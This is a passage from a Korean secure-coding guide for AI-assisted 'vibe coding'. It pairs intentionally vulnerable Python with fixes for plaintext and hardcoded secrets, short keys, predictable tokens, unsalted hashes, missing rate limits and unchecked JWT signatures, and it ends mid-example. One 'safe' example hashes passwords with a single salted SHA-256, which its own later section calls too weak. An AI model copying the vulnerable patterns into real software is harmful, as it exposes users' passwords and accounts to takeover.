바이브 코딩으로 빠르게 프로토타입을 만들 때, "일단 동작하게 만들고 나중에 암호화를 추가하자"라는 생각은 매우 위험합니다. 나중에 암호화를 추가하는 일은 처음부터 적용하는 것보다 훨씬 어렵고, 종종 잊혀지기도 합니다.

### 왜 위험한가

- **데이터베이스 유출**: 평문으로 저장된 패스워드는 DB 유출 사고 시 즉시 악용됩니다. 사용자들은 여러 사이트에서 같은 패스워드를 사용하는 경우가 많아 피해가 확대됩니다.
- **네트워크 도청**: 평문으로 전송된 정보는 패킷 스니핑(Packet Sniffing)을 통해 중간에서 가로챌 수 있습니다.
- **법적 책임**: 개인정보보호법에 따라 개인정보를 안전하게 관리하지 않을 경우 법적 제재를 받을 수 있습니다.

### 취약한 코드

다음은 패스워드를 평문으로 데이터베이스에 저장하는 ❌ 취약한 코드입니다.

```python
# ❌ 취약한 코드: 패스워드 평문 저장
def register_user(dbconn, username, password):
    cursor = dbconn.cursor()
    # 패스워드가 암호화 없이 그대로 저장됨
    cursor.execute(
        'INSERT INTO users (username, password) VALUES (%s, %s)',
        (username, password)
    )
    dbconn.commit()
```

```python
# ❌ 취약한 코드: 중요정보 평문 전송
import socket

def send_user_data(user_data):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect(('api.example.com', 80))
        # HTTP(평문)로 개인정보 전송
        s.sendall(user_data.encode('utf-8'))
```

### 안전한 코드

패스워드를 해시화하여 저장하고, HTTPS를 통해 전송하는 ✅ 안전한 코드입니다.

```python
# ✅ 안전한 코드: 패스워드를 해시화하여 저장
from Crypto.Hash import SHA256
import os

def register_user(dbconn, username, password):
    # 솔트 생성 후 패스워드와 결합하여 해시
    salt = os.urandom(32).hex()
    hash_obj = SHA256.new()
    hash_obj.update(bytes(password + salt, 'utf-8'))
    hashed_password = hash_obj.hexdigest()

    cursor = dbconn.cursor()
    cursor.execute(
        'INSERT INTO users (username, password, salt) VALUES (%s, %s, %s)',
        (username, hashed_password, salt)
    )
    dbconn.commit()
```

```python
# ✅ 안전한 코드: HTTPS를 사용한 안전한 전송
import requests

def send_user_data(user_data):
    # HTTPS를 사용하여 암호화된 채널로 전송
    response = requests.post(
        'https://api.example.com/users',  # HTTP가 아닌 HTTPS 사용
        json=user_data,
        verify=True  # SSL 인증서 검증 활성화
    )
    return response.json()
```

### 바이브 코딩 시 체크포인트

- [ ] 패스워드는 반드시 해시화(Hashing)하여 저장하고, 평문 저장 코드가 없는지 확인합니다.
- [ ] 외부 API 통신 시 `http://`가 아닌 `https://`를 사용하는지 확인합니다.
- [ ] 개인정보(이름, 전화번호, 주소 등)를 데이터베이스에 저장할 때 암호화를 적용하는지 확인합니다.
- [ ] AI에게 "패스워드는 해시로 저장하고, 통신은 HTTPS를 사용해줘"라고 명시합니다.

---

## 8-3. 하드코딩된 중요정보

### 개요

하드코딩(Hardcoding)이란 소스 코드 내부에 패스워드, API 키(API Key), 데이터베이스 접속 정보 등의 중요정보를 직접 문자열로 작성하는 것을 말합니다. **이것은 바이브 코딩에서 가장 빈번하게 발생하는 보안 실수입니다.**

AI에게 "데이터베이스에 연결하는 코드를 만들어줘"라고 요청하면, AI는 높은 확률로 코드 안에 예시 패스워드와 호스트 정보를 직접 작성합니다. 여러분이 이 코드를 그대로 사용하여 GitHub에 Push하면, 전 세계 누구나 여러분의 데이터베이스 접속 정보를 볼 수 있게 됩니다.

> **⚠️ 주의:** GitHub에는 API 키와 패스워드를 자동으로 수집하는 봇(Bot)이 활동하고 있습니다. 한번 Push된 정보는 커밋 기록에 남아 삭제해도 복구할 수 있습니다. 실수를 발견하면 키를 즉시 폐기하고 새로 발급받아야 합니다.

### 왜 위험한가

> **💡 팁:** AI가 생성한 주석에 민감정보가 포함되는 문제는 11장 11-2절에서 다룹니다.

하드코딩된 중요정보는 다음과 같은 경로로 유출됩니다.

- **소스코드 저장소(Repository) 노출**: GitHub, GitLab 등에 코드를 Push하면 공개 저장소의 경우 즉시 노출됩니다. 비공개 저장소라도 접근 권한이 있는 모든 개발자에게 노출됩니다.
- **로그(Log) 파일 노출**: 코드에 하드코딩된 값이 에러 메시지나 디버그 로그에 포함되어 출력될 수 있습니다.
- **빌드 산출물(Build Artifact) 노출**: 컴파일된 바이너리나 패키지에서 문자열을 추출하여 중요 정보를 획득할 수 있습니다.
- **AI 학습 데이터 오염**: 하드코딩된 키가 포함된 코드가 공개되면, AI 학습 데이터에 포함되어 다른 사람의 AI 응답에 여러분의 키가 노출될 수도 있습니다.

### 취약한 코드

다음은 AI가 흔히 생성하는 형태의 ❌ 취약한 코드입니다.

```python
# ❌ 취약한 코드: API 키와 DB 정보가 소스코드에 하드코딩
import pymysql
import openai

# OpenAI API 키가 소스코드에 그대로 노출
openai.api_key = "sk-proj-abc123xyz456..."

def get_db_connection():
    # 데이터베이스 접속 정보가 하드코딩됨
    return pymysql.connect(
        host='db.example.com',
        port=3306,
        user='admin',
        passwd='SuperSecret123!',
        db='production_db',
        charset='utf8'
    )

def call_stripe_api(amount):
    import stripe
    # 결제 API 키가 소스코드에 노출
    stripe.api_key = "sk_live_51ABC..."
    return stripe.Charge.create(amount=amount, currency="krw")
```

### 안전한 코드

환경 변수(Environment Variable)와 `.env` 파일을 활용하는 ✅ 안전한 코드입니다.

**Step 1: `.env` 파일 생성 (절대 Git에 커밋하지 않습니다)**

```bash
# .env 파일 (이 파일은 .gitignore에 반드시 추가)
OPENAI_API_KEY=sk-proj-abc123xyz456...
DB_HOST=db.example.com
DB_PORT=3306
DB_USER=admin
DB_PASSWORD=SuperSecret123!
DB_NAME=production_db
STRIPE_API_KEY=sk_live_51ABC...
```

**Step 2: `.gitignore`에 `.env` 추가**

```text
# .gitignore
.env
.env.local
.env.production
*.pem
*.key
```

**Step 3: 코드에서 환경 변수 사용**

```python
# ✅ 안전한 코드: 환경 변수를 통한 중요정보 관리
import os
import pymysql
from dotenv import load_dotenv
import openai

# .env 파일에서 환경 변수 로드
load_dotenv()

# 환경 변수에서 API 키를 가져옴
openai.api_key = os.environ.get('OPENAI_API_KEY')

def get_db_connection():
    return pymysql.connect(
        host=os.environ.get('DB_HOST'),
        port=int(os.environ.get('DB_PORT', 3306)),
        user=os.environ.get('DB_USER'),
        passwd=os.environ.get('DB_PASSWORD'),
        db=os.environ.get('DB_NAME'),
        charset='utf8'
    )

def call_stripe_api(amount):
    import stripe
    stripe.api_key = os.environ.get('STRIPE_API_KEY')
    return stripe.Charge.create(amount=amount, currency="krw")
```

> **💡 팁:** `os.environ['KEY']`는 키가 없으면 `KeyError`를 발생시키고, `os.environ.get('KEY')`는 `None`을 반환합니다. 필수 환경 변수의 경우 애플리케이션 시작 시 존재 여부를 확인하는 것이 좋습니다.

```python
# ✅ 환경 변수 존재 여부를 시작 시 검증
REQUIRED_ENV_VARS = ['OPENAI_API_KEY', 'DB_HOST', 'DB_PASSWORD']

def validate_env():
    missing = [var for var in REQUIRED_ENV_VARS if not os.environ.get(var)]
    if missing:
        raise EnvironmentError(f"필수 환경 변수가 설정되지 않았습니다: {', '.join(missing)}")
```

### 바이브 코딩 시 체크포인트

- [ ] AI가 생성한 코드에서 API 키, 패스워드, 시크릿 키(Secret Key)가 문자열로 하드코딩되어 있지 않은지 확인합니다.
- [ ] `.env` 파일을 생성하고, 반드시 `.gitignore`에 추가합니다.
- [ ] `python-dotenv` 라이브러리를 설치하여 환경 변수를 관리합니다.
- [ ] Git 커밋 전, `git diff`로 중요 정보가 포함되어 있지 않은지 확인합니다.
- [ ] 이미 커밋된 키가 있다면 즉시 해당 키를 폐기하고 새로 발급받습니다.
- [ ] AI에게 코드를 요청할 때 "API 키는 환경 변수에서 가져와줘"라고 반드시 명시합니다.

> **⚠️ 주의:** `.env.example` 파일을 만들어 필요한 환경 변수의 목록을 공유하되, 실제 값은 절대 포함하지 마십시오.

```text
# .env.example (이 파일은 Git에 커밋해도 됩니다)
OPENAI_API_KEY=your_api_key_here
DB_HOST=localhost
DB_PORT=3306
DB_USER=your_username
DB_PASSWORD=your_password
```

---

## 8-4. 충분하지 않은 키 길이

### 개요

암호화 키의 길이(Key Length)는 암호화의 강도를 결정하는 핵심 요소입니다. 아무리 안전한 알고리즘을 사용하더라도 키 길이가 충분하지 않으면, 공격자가 모든 가능한 키를 시도하는 브루트포스 공격으로 암호를 해독할 수 있습니다.

### 왜 위험한가

짧은 키 길이를 사용하면 공격자가 합리적인 시간 내에 모든 키 조합을 시도할 수 있습니다. 예를 들어 RSA 1024비트 키는 이미 안전하지 않은 것으로 분류되어 있으며, 2030년 이후에는 RSA 2048비트도 재검토가 필요할 수 있습니다.

### 권장 키 길이 표

다음은 알고리즘별 최소 권장 키 길이입니다.

| 알고리즘 유형 | 알고리즘 | ❌ 취약한 키 길이 | ✅ 권장 키 길이 |
|---|---|---|---|
| 대칭키 암호(Symmetric) | AES | 64비트 이하 | **128비트 이상** (권장 256비트) |
| 비대칭키 암호(Asymmetric) | RSA | 1024비트 이하 | **2048비트 이상** (권장 3072비트) |
| 비대칭키 암호 | DSA | 1024비트 이하 | **2048비트 이상** |
| 타원곡선 암호(ECC) | ECDSA | 160비트 이하 | **224비트 이상** (권장 256비트) |
| 해시 함수(Hash) | SHA | SHA-1 (160비트) | **SHA-256 이상** |

### 취약한 코드

```python
# ❌ 취약한 코드: RSA 1024비트 키 사용
from Crypto.PublicKey import RSA

def generate_key_pair():
    # 1024비트는 현대 컴퓨터로 해독 가능
    private_key = RSA.generate(1024)
    return private_key, private_key.publickey()
```

### 안전한 코드

```python
# ✅ 안전한 코드: RSA 2048비트 이상 키 사용
from Crypto.PublicKey import RSA

def generate_key_pair():
    # 2048비트 이상으로 설정 (권장: 3072비트 이상)
    private_key = RSA.generate(2048)
    return private_key, private_key.publickey()
```

```python
# ✅ 안전한 코드: ECC 256비트 키 사용
from Crypto.PublicKey import ECC

def generate_ecc_key():
    # P-256 곡선 사용 (224비트 이상)
    key = ECC.generate(curve='P-256')
    return key
```

### 바이브 코딩 시 체크포인트

- [ ] AI가 생성한 암호화 코드에서 키 길이 설정값을 확인합니다.
- [ ] RSA는 최소 2048비트, AES는 최소 128비트, ECC는 최소 224비트인지 확인합니다.
- [ ] `RSA.generate()`, `DSA.generate()` 등의 함수 호출에서 인자값을 반드시 확인합니다.
- [ ] AI에게 "RSA 2048비트 이상으로 키를 생성해줘"라고 명시합니다.

> **💡 팁:** 2030년 이후까지의 안전성을 고려한다면 RSA 3072비트, AES 256비트를 사용하는 것이 바람직합니다.


---

# Chapter 09. 난수, 패스워드, 그리고 인증 방어

## 9-1. 적절하지 않은 난수 값 사용

### 개요

난수(Random Number)는 세션 ID, 인증 토큰(Token), 암호화 키, 비밀번호 재설정 링크 등 보안에 민감한 다양한 곳에서 사용됩니다. 문제는 파이썬(Python)의 `random` 모듈이 생성하는 난수는 **의사 난수(Pseudo-Random Number)**로, 시드(Seed) 값을 알면 생성되는 모든 숫자를 예측할 수 있다는 것입니다.

바이브 코딩에서 AI에게 "랜덤 토큰을 생성해줘"라고 요청하면, AI는 종종 `random` 모듈을 사용하는 코드를 생성합니다. 이는 게임이나 시뮬레이션에서는 충분하지만, 보안 목적으로는 절대 사용해서는 안 됩니다.

### 왜 위험한가

예측 가능한 난수를 보안 목적으로 사용하면 다음과 같은 공격이 가능합니다.

- **세션 하이재킹(Session Hijacking)**: 세션 ID 생성에 `random`을 사용하면, 공격자가 다른 사용자의 세션 ID를 예측하여 로그인 상태를 탈취할 수 있습니다.
- **토큰 위조(Token Forgery)**: 패스워드 재설정 토큰이 예측 가능하면, 공격자가 다른 사용자의 패스워드를 재설정할 수 있습니다.
- **암호화 키 추측**: 암호화 키가 예측 가능한 난수로 생성되면 암호화 자체가 무력화됩니다.

### 취약한 코드

다음은 `random` 모듈로 보안 토큰을 생성하는 ❌ 취약한 코드입니다.

```python
# ❌ 취약한 코드: 보안 목적에 random 모듈 사용
import random
import string

def generate_session_id():
    # random 모듈은 예측 가능한 의사 난수를 생성
    random.seed(42)  # 고정 시드: 항상 같은 값이 생성됨
    return ''.join(random.choices(string.ascii_letters + string.digits, k=32))

def generate_reset_token():
    # 시드를 설정하지 않아도 random은 보안용으로 부적합
    return str(random.randint(100000, 999999))
```

### 안전한 코드

보안 목적에 적합한 `secrets` 모듈을 사용하는 ✅ 안전한 코드입니다.

```python
# ✅ 안전한 코드: secrets 모듈로 안전한 난수 생성
import secrets
import string

def generate_session_id():
    # secrets 모듈은 암호학적으로 안전한 난수를 생성
    return secrets.token_hex(32)  # 64자의 16진수 문자열

def generate_reset_token():
    # URL에서 사용하기 안전한 토큰 생성
    return secrets.token_urlsafe(32)

def generate_otp():
    # 6자리 숫자 OTP 생성
    return ''.join([str(secrets.randbelow(10)) for _ in range(6)])

def generate_api_key():
    # API 키 생성
    alphabet = string.ascii_letters + string.digits
    return ''.join(secrets.choice(alphabet) for _ in range(48))
```

> **💡 팁:** Python 3.6 미만의 환경에서는 `secrets` 모듈을 사용할 수 없습니다. 이 경우 `os.urandom()` 또는 `random.SystemRandom` 클래스를 사용하십시오.

```python
# Python 3.6 미만에서의 대안
import os
import binascii

def generate_token():
    return binascii.hexlify(os.urandom(32)).decode()
```

### 바이브 코딩 시 체크포인트

- [ ] AI가 생성한 코드에서 `import random`이 보안 관련 기능(토큰, 세션, 키 생성)에 사용되고 있지 않은지 확인합니다.
- [ ] 보안 관련 난수 생성에는 반드시 `secrets` 모듈을 사용합니다.
- [ ] `random.seed()`에 고정 값이 설정되어 있지 않은지 확인합니다.
- [ ] AI에게 "보안 토큰이니 secrets 모듈을 사용해줘"라고 명시합니다.

---

## 9-2. 취약한 패스워드 허용

### 개요

패스워드 정책(Password Policy)은 사용자가 설정하는 패스워드의 최소 요구 사항을 정의하는 규칙입니다. "1234", "password", "qwerty"와 같은 취약한 패스워드를 허용하면, 아무리 강력한 암호화를 적용하더라도 브루트포스 공격이나 사전 공격(Dictionary Attack)에 의해 쉽게 뚫릴 수 있습니다.

바이브 코딩에서 AI가 회원가입 기능을 생성할 때, 패스워드 유효성 검증(Validation) 로직을 포함하지 않는 경우가 많습니다. 사용자가 입력한 패스워드를 검증 없이 그대로 저장하는 것은 보안의 기본을 무시하는 것입니다.

### 왜 위험한가

- **사전 공격**: 흔히 사용되는 패스워드 목록을 대입하여 계정을 탈취합니다. "password123" 같은 패스워드는 수 초 만에 뚫립니다.
- **크리덴셜 스터핑(Credential Stuffing)**: 다른 사이트에서 유출된 패스워드를 그대로 시도합니다. 약한 패스워드일수록 여러 사이트에서 재사용될 확률이 높습니다.
- **레인보우 테이블 공격**: 짧고 단순한 패스워드는 이미 해시값이 계산되어 있는 테이블로 즉시 역추적 가능합니다.

### 취약한 코드

```python
# ❌ 취약한 코드: 패스워드 정책 없이 가입 허용
def register(request):
    username = request.POST.get('username')
    password = request.POST.get('password')
    # 패스워드 강도 확인 없이 바로 저장
    create_user(username, password)
    return redirect('/login')
```

### 안전한 코드

패스워드 정책을 적용하는 ✅ 안전한 코드입니다.

```python
# ✅ 안전한 코드: 패스워드 정책 적용
import re

def validate_password(password):
    """패스워드 정책 검증"""
    errors = []

    if len(password) < 8:
        errors.append("패스워드는 최소 8자 이상이어야 합니다.")
    if len(password) > 128:
        errors.append("패스워드는 128자를 초과할 수 없습니다.")
    if not re.search(r'[A-Z]', password):
        errors.append("대문자를 최소 1개 포함해야 합니다.")
    if not re.search(r'[a-z]', password):
        errors.append("소문자를 최소 1개 포함해야 합니다.")
    if not re.search(r'[0-9]', password):
        errors.append("숫자를 최소 1개 포함해야 합니다.")
    if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
        errors.append("특수문자를 최소 1개 포함해야 합니다.")

    # 흔히 사용되는 취약한 패스워드 차단
    common_passwords = ['password', '123456', 'qwerty', 'abc123', 'password123']
    if password.lower() in common_passwords:
        errors.append("너무 흔한 패스워드입니다. 다른 패스워드를 사용해주세요.")

    return errors

def register(request):
    username = request.POST.get('username')
    password = request.POST.get('password')

    errors = validate_password(password)
    if errors:
        return render(request, 'register.html', {'errors': errors})

    create_user(username, password)
    return redirect('/login')
```

Django를 사용하는 경우 내장된 패스워드 검증기(Password Validator)를 활용할 수 있습니다.

```python
# ✅ Django settings.py에서 패스워드 검증기 설정
AUTH_PASSWORD_VALIDATORS = [
    {'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator'},
    {'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',
     'OPTIONS': {'min_length': 8}},
    {'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator'},
    {'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator'},
]
```

### 바이브 코딩 시 체크포인트

- [ ] 회원가입 및 패스워드 변경 기능에 패스워드 강도 검증 로직이 포함되어 있는지 확인합니다.
- [ ] 최소 8자 이상, 대소문자/숫자/특수문자 조합을 요구하는지 확인합니다.
- [ ] 흔히 사용되는 패스워드(Common Password)를 차단하는 로직이 있는지 확인합니다.
- [ ] Django의 경우 `AUTH_PASSWORD_VALIDATORS` 설정을 활용합니다.

---

## 9-3. 솔트 없는 일방향 해시 함수 사용

### 패스워드 해싱 흐름도

```
┌─────────────────────────────────────────────────────────────────────┐
│                     패스워드 해싱 흐름도                            │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  ❌ 취약한 방식 (사용 금지)                                        │
│  ─────────────────────────                                          │
│                                                                     │
│  ┌──────────┐     ┌─────────────┐     ┌──────────────┐             │
│  │ 비밀번호 │══▶│  MD5/SHA-1  │══▶│ 해시값 저장  │             │
│  │ "1234"   │     │  (단순 해싱)│     │ e10adc3949...│             │
│  └──────────┘     └─────────────┘     └──────┬───────┘             │
│                                              │                      │
│                                              ▼                      │
│                                 ┌──────────────────────┐            │
│                                 │ ⚠️  레인보우 테이블로 │            │
│                                 │    수초 만에 크랙!    │            │
│                                 └──────────────────────┘            │
│                                                                     │
│                                                                     │
│  ✅ 안전한 방식 (권장)                                             │
│  ─────────────────────                                              │
│                                                                     │
│  ① 저장 흐름                                                       │
│                                                                     │
│  ┌──────────┐     ┌────────────────┐     ┌─────────────────────┐   │
│  │ 비밀번호 │──▶│ ② 랜덤 솔트  │──▶│ ③ bcrypt / argon2  │   │
│  │ "1234"   │     │    생성        │     │ (비밀번호 + 솔트)  │   │
│  └──────────┘     │ "x7Kp2m..."   │     │  반복 해싱 수천 회  │   │
│                    └────────────────┘     └──────────┬──────────┘   │
│                                                      │              │
│                                                      ▼              │
│                                          ┌───────────────────────┐  │
│                                          │ ④ 해시값 + 솔트 저장 │  │
│                                          │ "$2b$12$x7Kp2m..."   │  │
│                                          └───────────────────────┘  │
│                                                                     │
│                                                                     │
│  ⑤ 검증 흐름                                                       │
│                                                                     │
│  ┌──────────────┐   ┌─────────────────┐   ┌───────────────────┐    │
│  │ 입력 비밀번호│   │  저장된 솔트    │   │ 저장된 해시       │    │
│  │ (로그인 시)  │   │  (DB에서 조회)  │   │ (DB에서 조회)     │    │
│  └──────┬───────┘   └────────┬────────┘   └────────┬──────────┘    │
│         │                    │                      │               │
│         ▼                    ▼                      │               │
│  ┌─────────────────────────────────────┐            │               │
│  │ ⑥ bcrypt/argon2 (입력값 + 솔트)    │            │               │
│  │    동일 알고리즘으로 해싱           │            │               │
│  └──────────────────┬──────────────────┘            │               │
│                     │                               │               │
│                     ▼                               ▼               │
│              ┌─────────────────────────────────────────┐            │
│              │        ⑦ 해시값 비교 (일치 여부)        │            │
│              └─────────────┬──────────┬────────────────┘            │
│                            │          │                             │
│                     일치 ──▶        ══▶ 불일치                     │
│                            │          │                             │
│                            ▼          ▼                             │
│                    ┌──────────┐ ┌───────────┐                       │
│                    │ ✅ 인증  │ │ ❌ 인증   │                       │
│                    │    성공  │ │    실패   │                       │
│                    └──────────┘ └───────────┘                       │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### 개요

일방향 해시 함수(One-way Hash Function)는 원본 데이터를 복원할 수 없는 고정 길이의 해시값으로 변환합니다. 패스워드 저장에 널리 사용되지만, 솔트(Salt) 없이 해시만 적용하면 **레인보우 테이블 공격**에 취약합니다.

솔트란 해시 계산 전에 원본 데이터에 추가하는 무작위 문자열입니다. 같은 패스워드라도 솔트가 다르면 완전히 다른 해시값이 생성되므로, 사전 계산된 해시 테이블을 무력화합니다.

### 왜 위험한가

- **레인보우 테이블 공격**: 솔트 없는 SHA-256 해시값은 이미 계산된 거대한 테이블에서 원문을 찾아낼 수 있습니다.
- **동일 해시값 문제**: 같은 패스워드를 사용하는 모든 사용자의 해시값이 동일하게 됩니다. 하나의 해시가 해독되면 같은 패스워드를 사용하는 모든 계정이 노출됩니다.
- **GPU 가속 공격**: 단순 해시 함수(SHA-256 등)는 GPU를 활용하면 초당 수십억 개의 해시를 계산할 수 있어, 브루트포스 공격에 취약합니다.

### 취약한 코드

```python
# ❌ 취약한 코드: 솔트 없이 단순 SHA-256 해시만 사용
import hashlib

def hash_password(password):
    # 솔트 없이 해시하면 레인보우 테이블 공격에 취약
    return hashlib.sha256(password.encode('utf-8')).hexdigest()

def verify_password(password, stored_hash):
    return hash_password(password) == stored_hash
```

### 안전한 코드

bcrypt 또는 argon2를 사용하는 ✅ 안전한 코드입니다. 이 라이브러리들은 솔트를 자동으로 생성하고, **키 스트레칭(Key Stretching)** 기법으로 해시 계산 속도를 의도적으로 느리게 만들어 브루트포스 공격을 어렵게 합니다.

```python
# ✅ 안전한 코드: bcrypt 사용 (솔트 자동 생성 + 키 스트레칭)
import bcrypt

def hash_password(password):
    # bcrypt는 솔트를 자동으로 생성하고 해시에 포함시킴
    salt = bcrypt.gensalt(rounds=12)  # rounds가 높을수록 느리고 안전
    hashed = bcrypt.hashpw(password.encode('utf-8'), salt)
    return hashed.decode('utf-8')

def verify_password(password, stored_hash):
    return bcrypt.checkpw(
        password.encode('utf-8'),
        stored_hash.encode('utf-8')
    )
```

```python
# ✅ 안전한 코드: argon2 사용 (현재 가장 권장되는 알고리즘)
from argon2 import PasswordHasher

ph = PasswordHasher(
    time_cost=3,        # 반복 횟수
    memory_cost=65536,  # 메모리 사용량 (KB)
    parallelism=4       # 병렬 처리 수
)

def hash_password(password):
    # argon2는 솔트 자동 생성 + 메모리 하드(Memory-hard) 함수
    return ph.hash(password)

def verify_password(password, stored_hash):
    try:
        return ph.verify(stored_hash, password)
    except Exception:
        return False
```

> **💡 팁:** 패스워드 해싱 알고리즘의 권장 순위는 **Argon2 > bcrypt > scrypt > PBKDF2** 순입니다. 가능하다면 Argon2를 사용하십시오. `pip install argon2-cffi`로 설치할 수 있습니다.

### 바이브 코딩 시 체크포인트

- [ ] `hashlib.sha256(password)`처럼 솔트 없이 단순 해시만 사용하는 코드가 없는지 확인합니다.
- [ ] 패스워드 저장에는 반드시 `bcrypt`, `argon2`, 또는 `scrypt`를 사용합니다.
- [ ] Django의 경우 기본 패스워드 해시가 PBKDF2를 사용하므로, 필요 시 Argon2로 업그레이드합니다.
- [ ] AI에게 "패스워드 해싱에 bcrypt를 사용해줘"라고 명시합니다.

---

## 9-4. 반복된 인증시도 제한 기능 부재

### 개요

레이트 리미팅(Rate Limiting)이란 특정 시간 내에 허용되는 요청 횟수를 제한하는 기법입니다. 로그인 시도에 횟수 제한이 없으면, 공격자는 수백만 개의 패스워드를 자동으로 시도하는 브루트포스 공격(Brute-Force Attack)을 수행할 수 있습니다.

바이브 코딩으로 로그인 기능을 만들 때, AI는 보통 아이디와 패스워드를 확인하는 로직만 생성하고, 반복 시도에 대한 제한을 포함하지 않습니다.

### 왜 위험한가

- **브루트포스 공격**: 초당 수천 건의 로그인 시도로 패스워드를 알아낼 수 있습니다.
- **크리덴셜 스터핑**: 유출된 대량의 계정 정보를 자동으로 시도합니다.
- **서비스 거부(DoS)**: 대량의 로그인 요청으로 서버 자원이 고갈될 수 있습니다.
- **계정 잠금 우회**: 제한이 없으면 공격자는 시간 제약 없이 무한히 시도할 수 있습니다.

### 취약한 코드

```python
# ❌ 취약한 코드: 로그인 시도 횟수 제한 없음
from django.shortcuts import render, redirect

def login(request):
    username = request.POST.get('username')
    password = request.POST.get('password')
    # 횟수 제한 없이 무한히 로그인 시도 가능
    user = authenticate(username=username, password=password)
    if user:
        auth_login(request, user)
        return redirect('/dashboard')
    return render(request, 'login.html', {'error': '로그인 실패'})
```

### 안전한 코드

로그인 시도 횟수를 제한하는 ✅ 안전한 코드입니다.

```python
# ✅ 안전한 코드: django-axes를 활용한 로그인 시도 제한
# pip install django-axes

# settings.py
INSTALLED_APPS = [
    # ...
    'axes',
]

MIDDLEWARE = [
    # AxesMiddleware는 가장 마지막에 위치
    # ...
    'axes.middleware.AxesMiddleware',
]

AUTHENTICATION_BACKENDS = [
    'axes.backends.AxesStandaloneBackend',
    'django.contrib.auth.backends.ModelBackend',
]

# 5회 실패 시 계정 잠금
AXES_FAILURE_LIMIT = 5
# 30분 후 자동 잠금 해제
AXES_COOLOFF_TIME = 0.5  # 시간 단위 (0.5 = 30분)
# IP 기반 + 사용자명 기반 제한
AXES_LOCK_OUT_BY_COMBINATION_USER_AND_IP = True
```

Django를 사용하지 않는 경우 직접 구현할 수 있습니다.

```python
# ✅ 안전한 코드: 직접 구현한 레이트 리미팅
import time
from collections import defaultdict

class LoginRateLimiter:
    def __init__(self, max_attempts=5, lockout_duration=1800):
        self.max_attempts = max_attempts
        self.lockout_duration = lockout_duration  # 초 단위 (1800 = 30분)
        self.attempts = defaultdict(list)

    def is_locked(self, identifier):
        """계정이 잠겨 있는지 확인"""
        now = time.time()
        # 잠금 기간이 지난 시도 기록 제거
        self.attempts[identifier] = [
            t for t in self.attempts[identifier]
            if now - t < self.lockout_duration
        ]
        return len(self.attempts[identifier]) >= self.max_attempts

    def record_failure(self, identifier):
        """실패한 시도 기록"""
        self.attempts[identifier].append(time.time())

    def reset(self, identifier):
        """로그인 성공 시 기록 초기화"""
        self.attempts[identifier] = []

limiter = LoginRateLimiter()

def login(request):
    username = request.POST.get('username')
    client_ip = request.META.get('REMOTE_ADDR')
    identifier = f"{username}:{client_ip}"

    if limiter.is_locked(identifier):
        return render(request, 'login.html', {
            'error': '로그인 시도 횟수를 초과했습니다. 30분 후 다시 시도해주세요.'
        })

    user = authenticate(username=username, password=request.POST.get('password'))
    if user:
        limiter.reset(identifier)
        auth_login(request, user)
        return redirect('/dashboard')

    limiter.record_failure(identifier)
    remaining = limiter.max_attempts - len(limiter.attempts[identifier])
    return render(request, 'login.html', {
        'error': f'로그인 실패. 남은 시도 횟수: {remaining}회'
    })
```

FastAPI에서는 `slowapi` 라이브러리를 사용하여 레이트 리미팅을 적용할 수 있습니다.

```python
# ✅ FastAPI에서의 레이트 리미팅
# pip install slowapi
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)

@app.post("/login")
@limiter.limit("5/minute")  # 분당 5회로 제한
async def login(request: Request, credentials: LoginRequest):
    user = await authenticate(credentials.username, credentials.password)
    if not user:
        raise HTTPException(status_code=401, detail="로그인 실패")
    return {"token": create_token(user)}
```

### 바이브 코딩 시 체크포인트

- [ ] 로그인 기능에 시도 횟수 제한이 적용되어 있는지 확인합니다.
- [ ] Django 프로젝트의 경우 `django-axes` 라이브러리를 설치하여 활용합니다.
- [ ] 일정 횟수 이상 실패 시 계정 잠금 또는 CAPTCHA 도입을 고려합니다.
- [ ] 로그인 실패 시 "아이디 또는 패스워드가 틀렸습니다"와 같이 어떤 정보가 틀렸는지 구분하지 않는 메시지를 사용합니다.
- [ ] AI에게 "로그인 시도 횟수 제한을 포함해줘"라고 명시합니다.

> **⚠️ 주의:** 로그인 실패 메시지에서 "아이디가 존재하지 않습니다" 또는 "패스워드가 틀렸습니다"처럼 구체적인 정보를 제공하면, 공격자가 유효한 아이디를 식별하는 데 악용할 수 있습니다. 항상 모호한 메시지를 사용하십시오.


---

# Chapter 10. 서명, 인증서, 무결성 검증

## 10-1. 부적절한 전자서명 확인

### 개요

전자서명(Digital Signature)은 데이터의 무결성(Integrity)과 인증(Authentication)을 보장하는 암호학적 기법입니다. 웹 개발에서 가장 흔히 접하는 전자서명은 JWT(JSON Web Token)입니다. JWT는 사용자 인증 정보를 담고 있으며, 서명을 통해 토큰이 변조되지 않았음을 보장합니다.

문제는 JWT의 서명을 제대로 검증하지 않거나, `alg: none` 공격을 허용하면 공격자가 토큰을 위조하여 다른 사용자로 로그인할 수 있다는 것입니다.

### 왜 위험한가

부적절한 전자서명 확인은 다음과 같은 위험을 초래합니다.

- **토큰 위조**: 서명 검증을 생략하면, 공격자가 JWT의 페이로드(Payload)를 자유롭게 수정하여 관리자 권한을 획득할 수 있습니다.
- **알고리즘 혼동 공격(Algorithm Confusion)**: JWT 헤더의 `alg` 필드를 `none`으로 설정하여 서명 없이 토큰을 사용하는 공격입니다.
- **키 혼동 공격**: RS256(비대칭)으로 서명된 토큰을 HS256(대칭)으로 검증하도록 유도하여, 공개키를 비밀키로 사용하는 공격입니다.
- **데이터 변조**: API 요청의 전자서명을 검증하지 않으면, 요청 데이터가 중간에서 변조될 수 있습니다.

### 취약한 코드

다음은 JWT 서명을 제대로 검증하지 않는 ❌ 취약한 코드입니다.

```python
# ❌ 취약한 코드: JWT 서명 검증 미흡
import jwt

def get_user_from_token(token):
    # 서명을 검증하지 않고 디코딩 (verify=False)
    payload = jwt.decode(token, options={"verify_signature": False})
    return payload.get('user_id')

def verify_token_weak(token, secret):
    # algorithms 목록에 'none'을 허용
    payload = jwt.decode(token, secret, algorithms=["HS256", "none"])
    return payload
```

### 안전한 코드

JWT 서명을 올바르게 검증하는 ✅ 안전한 코드입니다.

```python
# ✅ 안전한 코드: JWT 서명 검증 포함
import jwt
from datetime import datetime, timedelta, timezone

